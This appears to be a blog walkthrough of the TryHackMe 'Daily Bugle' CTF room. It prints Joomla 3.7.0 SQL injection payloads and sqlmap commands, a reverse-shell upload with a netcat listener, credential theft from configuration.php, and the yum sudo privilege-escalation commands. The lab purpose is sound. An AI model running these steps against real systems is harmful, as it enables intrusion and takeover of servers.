+++
title = "THM: Daily Bugle -- Write-Up"
description = "Walkthrough write-up of the TryHackMe Daily Bugle CTF"
type = ["posts","post"]
tags = [
    "cmseek",
    "searchsploit",
    "joomla",
    "hydra",
    "sqlmap",
    "gtfobins",
    "yum"
]
date = "2022-08-10T15:32:00"
categories = [
    "ctf",
    "TryHackMe",
]
[ author ]
  name = "Rob"
+++

## About 
Biblioteca is a *hard* rated CTF room on [TryHackMe](https://tryhackme.com/room/dailybugle). Rooting this box involves carrying out a successful CMS enumeration, SQLi, hash cracking, and binary-based privilege escalation. 

**Note:** I have replaced all instances of the virtual machine's ip address with `<target-ip>` throughout this write-up.

## Enumeration
### nmap
```
Nmap scan report for <target-ip>
Host is up, received user-set (0.10s latency).
Scanned at 2022-06-16 15:11:23 EDT for 549s
Not shown: 65521 closed tcp ports (conn-refused)
PORT      STATE    SERVICE REASON      VERSION
22/tcp    open     ssh     syn-ack     OpenSSH 7.4 (protocol 2.0)

80/tcp    open     http    syn-ack     Apache httpd 2.4.6 ((CentOS) PHP/5.6.40)
| http-robots.txt: 15 disallowed entries 
| /joomla/administrator/ /administrator/ /bin/ /cache/ 
| /cli/ /components/ /includes/ /installation/ /language/ 
|_/layouts/ /libraries/ /logs/ /modules/ /plugins/ /tmp/
|_http-generator: Joomla! - Open Source Content Management
|_http-favicon: Unknown favicon MD5: 1194D7D32448E1F90741A97B42AF91FA
|_http-title: Home
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.6.40

3306/tcp  open     mysql   syn-ack     MariaDB (unauthorized)

15221/tcp filtered unknown no-response
15308/tcp filtered unknown no-response
22207/tcp filtered unknown no-response
23782/tcp filtered unknown no-response
26231/tcp filtered unknown no-response
30325/tcp filtered unknown no-response
32170/tcp filtered unknown no-response
39253/tcp filtered unknown no-response
45425/tcp filtered unknown no-response
60046/tcp filtered unknown no-response
65242/tcp filtered unknown no-response

```

In addition to Joomla, we see a robust `robots.txt` file on the machine's Apache web server.

`robots.txt`
```
# If the Joomla site is installed within a folder 
# eg www.example.com/joomla/ then the robots.txt file 
# MUST be moved to the site root 
# eg www.example.com/robots.txt
# AND the joomla folder name MUST be prefixed to all of the
# paths. 
# eg the Disallow rule for the /administrator/ folder MUST 
# be changed to read 
# Disallow: /joomla/administrator/
#
# For more information about the robots.txt standard, see:
# http://www.robotstxt.org/orig.html
#
# For syntax checking, see:
# http://tool.motoricerca.info/robots-checker.phtml

User-agent: *
Disallow: /administrator/
Disallow: /bin/
Disallow: /cache/
Disallow: /cli/
Disallow: /components/
Disallow: /includes/
Disallow: /installation/
Disallow: /language/
Disallow: /layouts/
Disallow: /libraries/
Disallow: /logs/
Disallow: /modules/
Disallow: /plugins/
Disallow: /tmp/
```

### CMS Enumeration with CMSeeK
[CMSeeK](https://github.com/Tuhinshubhra/CMSeeK) is a python3 CMS Detection and Exploitation suite and has scanning capabilities for WordPress, Joomla, Drupal and over 180 other CMSs. 

```
 ___ _  _ ____ ____ ____ _  _
|    |\/| [__  |___ |___ |_/  by @r3dhax0r
|___ |  | ___| |___ |___ | \_ Version 1.1.3 K-RONA


 [+]  Deep Scan Results  [+] 

[✔] Target: http://<target-ip>
[✔] Detected CMS: Joomla
[✔] CMS URL: https://joomla.org
[✔] Joomla Version: 3.7.0
[✔] Readme file: http://<target-ip>/README.txt
[✔] Admin URL: http://<target-ip>administrator


[✔] Open directories: 4
[*] Open directory url: 
   [>] http://<target-ip>administrator/templates
   [>] http://<target-ip>administrator/components
   [>] http://<target-ip>administrator/modules
   [>] http://<target-ip>images/banners

```

Excellent! Our scan shows that the server is running Jooma `version 3.7.0`. Let's see if we can find any viable information on [ExploitDB](https://www.exploit-db.com/).

## Exploitation 
### searchsploit
`searchsploit joomla 3.7.0`
```
                    ----------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                     |  Path
----------------------------------------------------------------------------------- ---------------------------------
Joomla! 3.7.0 - 'com_fields' SQL Injection                                         | php/webapps/42033.txt
Joomla! Component Easydiscuss < 4.0.21 - Cross-Site Scripting                      | php/webapps/43488.txt
----------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

╭─[kali-bot] as virtualtack in ~                                                                            16:18:47
╰──➤ locate 42033.txt  
/usr/share/exploitdb/exploits/php/webapps/42033.txt

```

Indeed, we find an SQL injection exploit that's created for the specific release that is running on the server. My Spidey Senses are tingling!

**Note:** For more about the Joomla 3.7.0 SQLi vulnerability, see: <a>https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html</a>.

`42033.txt`
```
# Exploit Title: Joomla 3.7.0 - Sql Injection
# Date: 05-19-2017
# Exploit Author: Mateus Lino
# Reference: https://blog.sucuri.net/2017/05/sql-injection-vulnerability-joomla-3-7.html
# Vendor Homepage: https://www.joomla.org/
# Version: = 3.7.0
# Tested on: Win, Kali Linux x64, Ubuntu, Manjaro and Arch Linux
# CVE : - CVE-2017-8917


URL Vulnerable: http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml%27


Using Sqlmap:

sqlmap -u "http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]


Parameter: list[fullordering] (GET)
    Type: boolean-based blind
    Title: Boolean-based blind - Parameter replace (DUAL)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(CASE WHEN (1573=1573) THEN 1573 ELSE 1573*(SELECT 1573 FROM DUAL UNION SELECT 9674 FROM DUAL) END)

    Type: error-based
    Title: MySQL >= 5.0 error-based - Parameter replace (FLOOR)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT 6600 FROM(SELECT COUNT(*),CONCAT(0x7171767071,(SELECT (ELT(6600=6600,1))),0x716a707671,FLOOR(RAND(0)*2))x FROM INFORMATION_SCHEMA.CHARACTER_SETS GROUP BY x)a)

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 time-based blind - Parameter replace (substraction)
    Payload: option=com_fields&view=fields&layout=modal&list[fullordering]=(SELECT * FROM (SELECT(SLEEP(5)))GDiu)%   

```

### SQLMap
While I chose to avoid using SQLMap (in preparation for an eventual OSCP attempt), we could use the following command to begin enumerating the server's MariaDB database. The exploit found earlier gives us a sample to get us started:
```
sqlmap -u "http://localhost/index.php?option=com_fields&view=fields&layout=modal&list[fullordering]=updatexml" --risk=3 --level=5 --random-agent --dbs -p list[fullordering]
```

### Exploiting Joomla with `joomblah.py`
Instead, I decided to use [joomblah.py](https://github.com/XiphosResearch/exploits/tree/master/Joomblah), a tool built specifically for the Joomla 3.7.0 SQLi exploit. 

`python3 joomblah.py http://<target-ip>`
```
 [-] Fetching CSRF token
 [-] Testing SQLi
  -  Found table: fb9j5_users
  -  Extracting users from fb9j5_users
 [$] Found user ['811', 'Super User', 'j---h', 'j---h@tryhackme.com', '$2y$-----------------------------m', '', '']
  -  Extracting sessions from fb9j5_session          
```

Success! This script returns the username, email address, and password hash of the Joomla `Super User`. Let's see if we can crack the hash offline.

### Offline Password Cracking with Hydra
`john  --wordlist=/usr/share/wordlists/rockyou.txt supass.txt`
```
Using default input encoding: UTF-8
Loaded 1 password hash (bcrypt [Blowfish 32/64 X3])
Cost 1 (iteration count) is 1024 for all loaded hashes
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
👍s----------3     (?)👍     
1g 0:00:05:39 DONE (2022-06-16 17:17) 0.002944g/s 137.8p/s 137.8c/s 137.8C/s thelma1..speciala
Use the "--show" option to display all of the cracked passwords reliably
Session completed.                                                                                           ~5m:40s 
```

We're on a roll now. John the Ripper was able to crack the Blowfish hash and give us the adminstrators' cleartext password.


## Foothold
### Joomla Administration Panel
![joomla-admin](/images/daily-bugle-joomla-admin.PNG)

Let's log-in to the Joomla admin panel (located at `/administrator`) and see what we can find.


![joomla-new-file](/images/daily-bugle-joomla-new-file.PNG)

Luckily for us, obtaining RCE via reverse shell is as easy in Joomla as it is in WordPRess. We can simply create a new file called `shell.php` that contains [pentestmonkey's reverse php shell](https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php) and upload it to the CMS. This can be done through the `Extensions` page, under `Templates -> Templates`, and selecting `New File` under the `Prostar` theme.

After setting up a netcat listener, we can then use our browser to execute the payload for a reverse shell. The uploaded `.php` file is accessible via the following directory:

`http://<target-ip>/templates/protostar/shell.php`
```
nc -lvnp 4444
listening on [any] 4444 ...
connect to [10.6.19.171] from (UNKNOWN) [<target-ip>] 42522
Linux dailybugle 3.10.0-1062.el7.x86_64 #1 SMP Wed Aug 7 18:08:02 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
 23:51:32 up 13 min,  0 users,  load average: 0.00, 0.03, 0.05
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=48(apache) gid=48(apache) groups=48(apache)
sh: no job control in this shell
sh-4.2$ whoami
whoami
apache
sh-4.2$ 

```

## Privilege Escalation 

Looking around, we first inspect the server's home directories. There's actually only one this time, belonging to `j------n`. Unfortunately we don't have any easy way of accessing the contents (yet). 

Next, we check out the server's web server directory (`/var/html/www`) as the `apache` user.

```
sh-4.2$ cd /var/www/html 
cd /var/www/html
sh-4.2$ ls
ls
LICENSE.txt
README.txt
administrator
bin
cache
cli
components
configuration.php
htaccess.txt
images
includes
index.php
language
layouts
libraries
media
modules
plugins
robots.txt
templates
tmp
web.config.txt

Here we are lucky enough to stumble upon `configuration.php`.

sh-4.2$ cat configuration.php
cat configuration.php
<?php
class JConfig {
	public $offline = '0';
	public $offline_message = 'This site is down for maintenance.<br />Please check back again soon.';
	public $display_offline_message = '1';
	public $offline_image = '';
	public $sitename = 'The Daily Bugle';
	public $editor = 'tinymce';
	public $captcha = '0';
	public $list_limit = '20';
	public $access = '1';
	public $debug = '0';
	public $debug_lang = '0';
	public $dbtype = 'mysqli';
	public $host = 'localhost';
	public $user = 👍'root';👍
	public $password = 👍'n----------u';👍
	public $db = 'joomla';
	public $dbprefix = 'fb9j5_';
	public $live_site = '';
	public $secret = 'UAMBRWzHO3oFPmVC';
	public $gzip = '0';
	public $error_reporting = 'default';
	public $helpurl = 'https://help.joomla.org/proxy/index.php?keyref=Help{major}{minor}:{keyref}';
	public $ftp_host = '127.0.0.1';
	public $ftp_port = '21';
	public $ftp_user = '';
	public $ftp_pass = '';
	public $ftp_root = '';
	public $ftp_enable = '0';
	public $offset = 'UTC';
	public $mailonline = '1';
	public $mailer = 'mail';
	public $mailfrom = 'j---h@tryhackme.com';
	public $fromname = 'The Daily Bugle';
	public $sendmail = '/usr/sbin/sendmail';
	public $smtpauth = '0';
	public $smtpuser = '';
	public $smtppass = '';
	public $smtphost = 'localhost';
	public $smtpsecure = 'none';
	public $smtpport = '25';
	public $caching = '0';
	public $cache_handler = 'file';
	public $cachetime = '15';
	public $cache_platformprefix = '0';
	public $MetaDesc = 'New York City tabloid newspaper';
	public $MetaKeys = '';
	public $MetaTitle = '1';
	public $MetaAuthor = '1';
	public $MetaVersion = '0';
	public $robots = '';
	public $sef = '1';
	public $sef_rewrite = '0';
	public $sef_suffix = '0';
	public $unicodeslugs = '0';
	public $feed_limit = '10';
	public $feed_email = 'none';
	public $log_path = '/var/www/html/administrator/logs';
	public $tmp_path = '/var/www/html/tmp';
	public $lifetime = '15';
	public $session_handler = 'database';
	public $shared_session = '0';
}sh-4.2$ 

```
Luckily for us, in addition to giving us access to the MariaDB database that powers the Joomla instance, this password also allows to log in via `ssh` as `j------n`! 

## Privilege escalation
As a good standard practice, we run `sudo -l` upon gaining user access. In this case, that really pays off:

```
[j------n@dailybugle ~]$ sudo -l
Matching Defaults entries for j------n on dailybugle:
    !visiblepw, always_set_home, match_group_by_gid, always_query_group_plugin, env_reset, env_keep="COLORS DISPLAY
    HOSTNAME HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE",
    env_keep+="LC_COLLATE LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC
    LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY",
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User j------n may run the following commands on dailybugle:
    (ALL) NOPASSWD: /usr/bin/yum
[j------n@dailybugle ~]$ 

```

Even better, there's an entry for `yum` on [GTFOBins](`https://gtfobins.github.io/gtfobins/yum/#sudo`). Let's escalate our privileges!

```
[j------n@dailybugle ~]$ TF=$(mktemp -d)
[j------n@dailybugle ~]$ cat >$TF/x<<EOF
> [main]
> plugins=1
> pluginpath=$TF
> pluginconfpath=$TF
> EOF
[j------n@dailybugle ~]$ 
[j------n@dailybugle ~]$ cat >$TF/y.conf<<EOF
> [main]
> enabled=1
> EOF
[j------n@dailybugle ~]$ 
[j------n@dailybugle ~]$ cat >$TF/y.py<<EOF
> import os
> import yum
> from yum.plugins import PluginYumExit, TYPE_CORE, TYPE_INTERACTIVE
> requires_api_version='2.1'
> def init_hook(conduit):
>   os.execl('/bin/sh','/bin/sh')
> EOF
[j------n@dailybugle ~]$ 
[j------n@dailybugle ~]$ sudo yum -c $TF/x --enableplugin=y
Loaded plugins: y
No plugin match for: y
sh-4.2# whoami
root
```

## Lessons learned

* This was (yet another) great lesson in not underestimating the frequency with which people re-use passwords!
* Equally, fully exploring/enumerating the web directories of a server running a web application should always be a priority!
* With great power must also come great responsibility.
